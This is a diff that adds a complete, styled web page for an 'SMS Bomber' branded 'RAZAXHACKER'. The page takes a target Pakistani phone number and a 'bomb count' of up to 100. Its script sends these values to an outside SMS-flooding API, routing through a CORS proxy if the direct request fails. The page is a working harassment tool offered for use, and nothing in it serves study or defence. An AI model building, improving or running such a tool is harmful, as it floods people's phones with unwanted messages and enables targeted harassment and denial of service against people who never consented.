@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>RAZA X SMS Bomber</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', system-ui, sans-serif;
+        }
+
+        /* 7-Color Animated Gradient Background */
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(
+                45deg, 
+                #ff9a9e, 
+                #fecfef, 
+                #a1c4fd, 
+                #c2e9fb, 
+                #d4fc79, 
+                #96e6a1, 
+                #fdcbf1
+            );
+            background-size: 400% 400%;
+            animation: gradientBG 20s ease infinite;
+            padding: 1.5rem;
+            color: #1e293b;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        /* Advanced White Glassmorphism Card */
+        .card {
+            max-width: 480px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.55);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 2.5rem;
+            padding: 2.5rem 2.2rem 2.2rem;
+            box-shadow: 
+                0 30px 60px -12px rgba(0, 0, 0, 0.15), 
+                0 18px 36px -18px rgba(0, 0, 0, 0.1),
+                inset 0 0 0 1px rgba(255, 255, 255, 0.8);
+            border: 1px solid rgba(255, 255, 255, 0.6);
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Decorative Background Orbs */
+        .card::before {
+            content: '';
+            position: absolute;
+            top: -50px;
+            left: -50px;
+            width: 150px;
+            height: 150px;
+            background: radial-gradient(circle, rgba(255,255,255,0.8) 0%, rgba(255,255,255,0) 70%);
+            border-radius: 50%;
+            z-index: 0;
+        }
+
+        .header, .form-group, .btn-bomb, #responseBox, .footer {
+            position: relative;
+            z-index: 1;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 2.5rem;
+        }
+
+        .header .icon {
+            font-size: 2.5rem;
+            color: #4f46e5;
+            background: rgba(255, 255, 255, 0.8);
+            width: 80px;
+            height: 80px;
+            line-height: 80px;
+            border-radius: 50%;
+            margin: 0 auto 1rem;
+            box-shadow: 0 10px 25px rgba(79, 70, 229, 0.2), inset 0 0 0 1px rgba(255, 255, 255, 1);
+            animation: pulse-light 2.5s infinite;
+        }
+
+        @keyframes pulse-light {
+            0% { box-shadow: 0 0 0 0 rgba(79, 70, 229, 0.3), inset 0 0 0 1px rgba(255, 255, 255, 1); }
+            70% { box-shadow: 0 0 0 15px rgba(79, 70, 229, 0), inset 0 0 0 1px rgba(255, 255, 255, 1); }
+            100% { box-shadow: 0 0 0 0 rgba(79, 70, 229, 0), inset 0 0 0 1px rgba(255, 255, 255, 1); }
+        }
+
+        .header h1 {
+            color: #0f172a;
+            font-size: 2.2rem;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            margin-bottom: 0.2rem;
+        }
+
+        .header h1 span {
+            background: linear-gradient(135deg, #4f46e5, #ec4899);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .header .sub {
+            color: #475569;
+            font-size: 0.95rem;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .header .sub strong {
+            color: #4f46e5;
+            font-weight: 700;
+        }
+
+        .form-group {
+            margin-bottom: 1.8rem;
+        }
+
+        .form-group label {
+            display: block;
+            color: #334155;
+            font-weight: 600;
+            font-size: 0.95rem;
+            margin-bottom: 0.5rem;
+            padding-left: 0.5rem;
+        }
+
+        .form-group label i {
+            margin-right: 8px;
+            color: #4f46e5;
+            width: 18px;
+        }
+
+        .input-wrapper {
+            display: flex;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.6);
+            border-radius: 1.2rem;
+            padding: 0.3rem 0.3rem 0.3rem 1.2rem;
+            border: 1px solid rgba(255, 255, 255, 0.9);
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.02);
+            transition: all 0.3s ease;
+        }
+
+        .input-wrapper:focus-within {
+            border-color: #4f46e5;
+            background: rgba(255, 255, 255, 0.9);
+            box-shadow: 0 0 0 4px rgba(79, 70, 229, 0.15), inset 0 2px 4px rgba(0, 0, 0, 0.02);
+        }
+
+        .input-wrapper .prefix {
+            color: #64748b;
+            font-weight: 600;
+            font-size: 1rem;
+            margin-right: 8px;
+            border-right: 2px solid rgba(0,0,0,0.1);
+            padding-right: 12px;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            padding: 0.85rem 0.8rem;
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #0f172a;
+            font-size: 1.05rem;
+            font-weight: 600;
+        }
+
+        .input-wrapper input::placeholder {
+            color: #94a3b8;
+            font-weight: 400;
+        }
+
+        input[type="number"]::-webkit-inner-spin-button,
+        input[type="number"]::-webkit-outer-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        input[type="number"] {
+            -moz-appearance: textfield;
+        }
+
+        .btn-bomb {
+            width: 100%;
+            padding: 1.1rem;
+            background: linear-gradient(135deg, #4f46e5, #6366f1, #a855f7);
+            background-size: 200% auto;
+            border: none;
+            border-radius: 1.8rem;
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: #fff;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 20px rgba(79, 70, 229, 0.3), inset 0 1px 0 rgba(255,255,255,0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn-bomb:hover {
+            background-position: right center;
+            transform: translateY(-3px);
+            box-shadow: 0 15px 25px rgba(79, 70, 229, 0.4), inset 0 1px 0 rgba(255,255,255,0.3);
+        }
+
+        .btn-bomb:active {
+            transform: scale(0.98) translateY(0);
+        }
+
+        .btn-bomb.loading {
+            background: linear-gradient(135deg, #94a3b8, #cbd5e1);
+            color: #475569;
+            box-shadow: none;
+            cursor: not-allowed;
+            pointer-events: none;
+        }
+
+        .btn-bomb .btn-text {
+            transition: all 0.3s ease;
+        }
+
+        .btn-bomb .btn-loader {
+            display: none;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .btn-bomb.loading .btn-text {
+            display: none;
+        }
+
+        .btn-bomb.loading .btn-loader {
+            display: flex;
+        }
+
+        .btn-bomb .spinner {
+            width: 22px;
+            height: 22px;
+            border: 3px solid rgba(71, 85, 105, 0.2);
+            border-top: 3px solid #475569;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        #responseBox {
+            margin-top: 1.8rem;
+            padding: 1.2rem 1.5rem;
+            border-radius: 1.2rem;
+            background: rgba(255, 255, 255, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.9);
+            border-left: 5px solid #4f46e5;
+            color: #334155;
+            font-size: 0.95rem;
+            font-weight: 500;
+            min-height: 60px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.03);
+        }
+
+        #responseBox i {
+            color: #4f46e5;
+            font-size: 1.3rem;
+        }
+
+        .footer {
+            margin-top: 2.5rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid rgba(0, 0, 0, 0.08);
+            text-align: center;
+        }
+
+        .footer .dev {
+            color: #64748b;
+            font-size: 0.9rem;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+        }
+
+        .footer .dev strong {
+            color: #0f172a;
+            font-weight: 700;
+            background: linear-gradient(135deg, #4f46e5, #ec4899);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .request-info {
+            margin-top: 0.8rem;
+            padding: 0.8rem 1rem;
+            background: rgba(255, 255, 255, 0.8);
+            border-radius: 0.8rem;
+            font-size: 0.75rem;
+            color: #475569;
+            display: none;
+            font-family: monospace;
+            word-break: break-all;
+            border: 1px dashed #cbd5e1;
+        }
+
+        .request-info.show {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .request-info span {
+            color: #4f46e5;
+            font-weight: 600;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 2rem 1.5rem 1.5rem;
+                border-radius: 2rem;
+            }
+            .header h1 {
+                font-size: 1.8rem;
+            }
+            .btn-bomb {
+                font-size: 1.1rem;
+                padding: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+
+    <div class="header">
+        <div class="icon">
+            <i class="fas fa-meteor"></i>
+        </div>
+        <h1>RAZA <span>BOMBER</span></h1>
+        <p class="sub"><strong>POWERED BY RAZAXHACKER</strong></p>
+    </div>
+
+    <form id="bomberForm">
+        <div class="form-group">
+            <label for="phoneInput"><i class="fas fa-mobile-screen-button"></i> Target Phone</label>
+            <div class="input-wrapper">
+                <span class="prefix">+92</span>
+                <input type="text" id="phoneInput" placeholder="3001234567" value="" required />
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label for="countInput"><i class="fas fa-layer-group"></i> Bomb Count</label>
+            <div class="input-wrapper">
+                <input type="number" id="countInput" placeholder="10" value="10" min="1" max="100" />
+            </div>
+        </div>
+
+        <button type="submit" class="btn-bomb" id="bombBtn">
+            <span class="btn-text">
+                <i class="fas fa-fire-flame-curved"></i> Launch Strike
+            </span>
+            <span class="btn-loader">
+                <span class="spinner"></span>
+                <span id="btnStatus">Initializing...</span>
+            </span>
+        </button>
+    </form>
+
+    <div id="responseBox">
+        <i class="fas fa-shield-halved"></i>
+        <span id="responseText">System Ready. Awaiting target coordinates.</span>
+    </div>
+
+    <div class="request-info" id="requestInfo">
+        📡 <span id="reqDisplay"></span>
+    </div>
+
+    <div class="footer">
+        <div class="dev">
+            <strong>POWERED BY RAZAXHACKER</strong>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    (function() {
+        "use strict";
+
+        const form = document.getElementById('bomberForm');
+        const phoneInput = document.getElementById('phoneInput');
+        const countInput = document.getElementById('countInput');
+        const bombBtn = document.getElementById('bombBtn');
+        const responseText = document.getElementById('responseText');
+        const responseIcon = document.getElementById('responseBox').querySelector('i');
+        const btnStatus = document.getElementById('btnStatus');
+        const requestInfo = document.getElementById('requestInfo');
+        const reqDisplay = document.getElementById('reqDisplay');
+
+        // API Endpoint (Kept strictly identical to original logic)
+        const API_BASE = 'https://smsbomberapi-ruby.vercel.app/api/send';
+
+        function setResponse(message, type = 'info') {
+            const iconMap = {
+                'success': 'fa-circle-check',
+                'error': 'fa-triangle-exclamation',
+                'warning': 'fa-circle-exclamation',
+                'info': 'fa-shield-halved'
+            };
+            const colorMap = {
+                'success': '#10b981', // Emerald green
+                'error': '#ef4444',   // Red
+                'warning': '#f59e0b', // Amber
+                'info': '#4f46e5'     // Indigo
+            };
+            
+            responseIcon.className = `fas ${iconMap[type] || 'fa-shield-halved'}`;
+            responseIcon.style.color = colorMap[type];
+            responseText.textContent = message;
+            document.getElementById('responseBox').style.borderLeftColor = colorMap[type];
+            
+            // Add subtle glow effect on response box based on state
+            document.getElementById('responseBox').style.boxShadow = `0 4px 15px ${colorMap[type]}20`;
+        }
+
+        function showRequestInfo(text) {
+            reqDisplay.textContent = text;
+            requestInfo.classList.add('show');
+            setTimeout(() => {
+                requestInfo.classList.remove('show');
+            }, 5000);
+        }
+
+        // Advanced Phone Normalization Logic
+        // Handles: 03xxxxxxxxx, 3xxxxxxxxx, 923xxxxxxxxx, +923xxxxxxxxx, etc.
+        function normalizePhoneNumber(rawPhone) {
+            // 1. Remove all non-numeric characters except '+'
+            let cleaned = rawPhone.replace(/[^\d+]/g, '');
+            
+            // 2. Strip leading +92, 92, or 0
+            cleaned = cleaned.replace(/^(\+92|92|0)/, '');
+            
+            return cleaned;
+        }
+
+        // Validate normalized phone (Must be exactly 10 digits and start with 3)
+        function validatePhone(normalizedPhone) {
+            return normalizedPhone.length === 10 && /^[3]/.test(normalizedPhone);
+        }
+
+        // Main send function with CORS proxy (Original Logic Preserved)
+        async function sendBomb(cleanPhone, count) {
+            try {
+                const url = `${API_BASE}?phone=${cleanPhone}&count=${count}`;
+                
+                console.log('[SEND]', url);
+                showRequestInfo(`Executing API Call: phone=${cleanPhone}&count=${count}`);
+
+                // Try direct fetch with CORS proxy fallback
+                let response;
+                try {
+                    response = await fetch(url, {
+                        method: 'GET',
+                        headers: {
+                            'Accept': 'application/json'
+                        }
+                    });
+                } catch (corsError) {
+                    console.warn('CORS error, routing through proxy sequence...');
+                    const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(url)}`;
+                    response = await fetch(proxyUrl, {
+                        method: 'GET',
+                        headers: {
+                            'Accept': 'application/json'
+                        }
+                    });
+                }
+
+                const data = await response.json();
+                console.log('[RESPONSE]', data);
+
+                if (response.ok && data.status === 'success') {
+                    setResponse(`✅ ${data.message || 'Strike successful! Target hit.'}`, 'success');
+                } else {
+                    const errMsg = data.message || data.error || 'Server responded with an error';
+                    setResponse(`❌ ${errMsg}`, 'error');
+                }
+
+            } catch (error) {
+                console.error('[ERROR]', error);
+                setResponse(`❌ System Error: ${error.message}`, 'error');
+            } finally {
+                // Restore button state
+                bombBtn.classList.remove('loading');
+                bombBtn.innerHTML = `
+                    <span class="btn-text">
+                        <i class="fas fa-fire-flame-curved"></i> Launch Strike
+                    </span>
+                    <span class="btn-loader">
+                        <span class="spinner"></span>
+                        <span id="btnStatus">Initializing...</span>
+                    </span>
+                `;
+            }
+        }
+
+        // Form Submission Logic
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            console.log('[SUBMIT] Sequence Initiated');
+
+            const rawPhone = phoneInput.value.trim();
+            const countStr = countInput.value.trim();
+            const count = parseInt(countStr, 10);
+
+            // Validation & Normalization Checks
+            if (!rawPhone) {
+                setResponse('Please enter target coordinates (Phone Number)', 'warning');
+                return;
+            }
+
+            // Apply Advanced Normalization
+            const normalizedPhone = normalizePhoneNumber(rawPhone);
+
+            if (!validatePhone(normalizedPhone)) {
+                setResponse('Invalid Target. Must be a valid Pakistani number (e.g., 03xx, +923xx)', 'error');
+                return;
+            }
+
+            if (!countStr || isNaN(count) || count < 1) {
+                setResponse('Bomb count must be at least 1', 'warning');
+                return;
+            }
+            
+            if (count > 100) {
+                setResponse('Max payload capacity is 100 per strike', 'error');
+                return;
+            }
+
+            // Visual Processing State
+            bombBtn.classList.add('loading');
+            btnStatus.textContent = 'Transmitting...';
+            setResponse(`📤 Locking target: ${normalizedPhone} | Payload: ${count}x`, 'info');
+
+            // 1.5s Animation delay for premium feel before firing
+            await new Promise(resolve => setTimeout(resolve, 1500));
+
+            // Execute Backend Logic
+            await sendBomb(normalizedPhone, count);
+        });
+
+        console.log('[READY] Team Zero Bomber Protocol Online');
+
+    })();
+</script>
+
+</body>
+</html>
